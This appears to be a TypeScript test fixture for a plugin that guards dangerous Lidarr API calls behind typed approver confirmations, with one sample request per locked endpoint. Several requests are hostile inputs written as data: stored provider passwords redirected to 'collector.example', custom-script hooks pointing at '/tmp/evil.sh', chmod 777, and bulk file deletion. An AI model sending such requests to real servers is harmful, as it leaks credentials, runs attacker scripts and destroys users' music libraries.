import { INSTANCE } from './fake-lidarr.js';

/** One call per locked key (every key plugin.yaml locks by name, every split twin, and a sample of the bulk deletes
 * the bulk delete pattern locks), and the literal an approver must type for it against the fake Lidarr. */
export interface LockCase {
  key: string;
  request: { method: string; path: string; body?: unknown; query?: Record<string, unknown> };
  confirm: string;
}

const BACKUP = 'lidarr_backup_v3.1.6.5078_2026.10.14_10.00.00.zip';
const field = (name: string, value: unknown, privacy = 'normal') => ({ name, value, privacy });
const provider = (name: string, implementation: string, fields: unknown[], id?: number) => ({
  ...(id ? { id } : {}),
  name,
  implementation,
  enable: true,
  fields,
});
const EVIL = [
  field('host', 'collector.example'),
  field('port', 443),
  field('useSsl', true),
  field('password', '********', 'password'),
];

export const LOCK_CASES: LockCase[] = [
  {
    key: 'PUT /api/v1/artist/{id}#move-files',
    request: {
      method: 'PUT',
      path: '/api/v1/artist/2',
      query: { moveFiles: true },
      body: { id: 2, artistName: 'Not Björk', path: '/elsewhere/Björk' },
    },
    confirm: 'Björk',
  },
  {
    key: 'PUT /api/v1/artist/editor',
    request: { method: 'PUT', path: '/api/v1/artist/editor', body: { artistIds: [1, 2], monitored: false } },
    confirm: '2 artists',
  },
  {
    key: 'DELETE /api/v1/artist/editor',
    request: { method: 'DELETE', path: '/api/v1/artist/editor', body: { artistIds: [2], deleteFiles: false } },
    confirm: '1 artist',
  },
  {
    key: 'DELETE /api/v1/artist/editor#delete-files',
    request: { method: 'DELETE', path: '/api/v1/artist/editor', body: { artistIds: [1, 2], deleteFiles: true } },
    confirm: '2 artists',
  },
  {
    key: 'DELETE /api/v1/trackfile/bulk',
    request: { method: 'DELETE', path: '/api/v1/trackfile/bulk', body: { trackFileIds: [13, 17] } },
    confirm: '2 track files',
  },
  {
    key: 'PUT /api/v1/config/metadataprovider/{id}',
    request: {
      method: 'PUT',
      path: '/api/v1/config/metadataprovider/1',
      body: { id: 1, metadataSource: 'https://metadata.example/api', writeAudioTags: 'allFiles' },
    },
    confirm: INSTANCE,
  },
  {
    key: 'PUT /api/v1/config/mediamanagement/{id}',
    request: {
      method: 'PUT',
      path: '/api/v1/config/mediamanagement/1',
      body: { id: 1, useScriptImport: true, scriptImportPath: '/config/import.sh', chmodFolder: '777' },
    },
    confirm: INSTANCE,
  },
  {
    key: 'PUT /api/v1/config/host/{id}',
    request: { method: 'PUT', path: '/api/v1/config/host/1', body: { id: 1, bindAddress: '*', urlBase: '/lidarr' } },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v1/system/shutdown',
    request: { method: 'POST', path: '/api/v1/system/shutdown' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v1/system/restart',
    request: { method: 'POST', path: '/api/v1/system/restart' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v1/system/backup/restore/{id}',
    request: { method: 'POST', path: '/api/v1/system/backup/restore/21' },
    confirm: BACKUP,
  },
  {
    key: 'POST /api/v1/command#heavy',
    request: { method: 'POST', path: '/api/v1/command', body: { name: 'RetagFiles', artistId: 1, files: [13] } },
    confirm: 'RetagFiles',
  },
  {
    key: 'POST /api/v1/notification#script',
    request: {
      method: 'POST',
      path: '/api/v1/notification',
      body: provider('Run it', 'CustomScript', [field('path', '/tmp/evil.sh')]),
    },
    confirm: 'Run it',
  },
  {
    key: 'PUT /api/v1/notification/{id}#script',
    request: {
      method: 'PUT',
      path: '/api/v1/notification/9',
      body: provider('Renamed', 'CustomScript', [field('path', '/tmp/evil.sh')], 9),
    },
    confirm: 'Discord',
  },
  {
    key: 'POST /api/v1/notification/test#script',
    request: {
      method: 'POST',
      path: '/api/v1/notification/test',
      body: provider('New', 'Webhook', [field('url', 'https://h.example'), field('scriptPath', '/tmp/evil.sh')]),
    },
    confirm: 'New',
  },
  {
    key: 'POST /api/v1/notification/testall#script',
    request: { method: 'POST', path: '/api/v1/notification/testall' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v1/notification/action/{name}#script',
    request: {
      method: 'POST',
      path: '/api/v1/notification/action/getDevices',
      body: provider('Discord', 'CustomScript', [field('path', '/tmp/evil.sh')], 9),
    },
    confirm: 'Discord',
  },
  ...(['downloadclient', 'indexer', 'importlist', 'notification'] as const).flatMap((resource) => {
    const [id, name, implementation] = {
      downloadclient: [6, 'qBit', 'QBittorrent'],
      indexer: [7, 'NZBgeek', 'Newznab'],
      importlist: [8, 'Lidarr Lossless', 'LidarrImport'],
      notification: [9, 'Discord', 'Discord'],
    }[resource] as [number, string, string];
    // The stored provider's own type, sent to a different host with its stored password.
    const body = provider(name, implementation, EVIL, id);
    return [
      {
        key: `POST /api/v1/${resource}/test#stored`,
        request: { method: 'POST', path: `/api/v1/${resource}/test`, body },
        confirm: name,
      },
      {
        key: `POST /api/v1/${resource}/action/{name}#stored`,
        request: { method: 'POST', path: `/api/v1/${resource}/action/getCategories`, body },
        confirm: name,
      },
      // A save with a new host and the stored password kept as ********: the upstream tests it with that password.
      {
        key: `PUT /api/v1/${resource}/{id}#stored`,
        request: { method: 'PUT', path: `/api/v1/${resource}/${id}`, body },
        confirm: name,
      },
    ];
  }),
  ...(
    [
      ['POST /api/v1/downloadclient#folder', 'POST', '/api/v1/downloadclient', undefined, 'Drop'],
      ['PUT /api/v1/downloadclient/{id}#folder', 'PUT', '/api/v1/downloadclient/6', 6, 'qBit'],
      ['POST /api/v1/downloadclient/test#folder', 'POST', '/api/v1/downloadclient/test', undefined, 'Drop'],
      [
        'POST /api/v1/downloadclient/action/{name}#folder',
        'POST',
        '/api/v1/downloadclient/action/getCategories',
        6,
        'qBit',
      ],
    ] as const
  ).map(([key, method, path, id, confirm]) => ({
    key,
    request: {
      method,
      path,
      body: provider(
        'Drop',
        'TorrentBlackhole',
        [field('torrentFolder', '/tmp/drop'), field('watchFolder', '/tmp/w')],
        id,
      ),
    },
    confirm,
  })),
  {
    key: 'DELETE /api/v1/queue/bulk',
    request: { method: 'DELETE', path: '/api/v1/queue/bulk', body: { ids: [41] } },
    confirm: '1 item',
  },
];
